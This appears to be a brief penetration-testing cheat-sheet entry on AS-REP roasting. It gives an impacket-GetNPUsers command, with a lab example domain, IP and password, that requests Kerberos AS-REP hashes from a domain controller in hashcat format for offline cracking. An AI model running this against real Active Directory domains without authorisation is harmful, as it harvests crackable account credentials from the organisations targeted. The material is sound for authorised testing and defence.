# Roasting
## ASREPRoast
```bash
impacket-GetNPUsers -format hashcat -outputfile ASREProastables.txt -dc-ip $KDC_IP -request "$DOMAIN/$USER:$PASSWD"
# impacket-GetNPUsers -format hashcat -outputfile ASREProastables.txt -dc-ip 192.168.68.64 -request 'CONTOSO.ORG/TestAlpha:win10-gui-P@$swd'
# use 'CONTOSO.ORG/' for unauthenticated bind
```
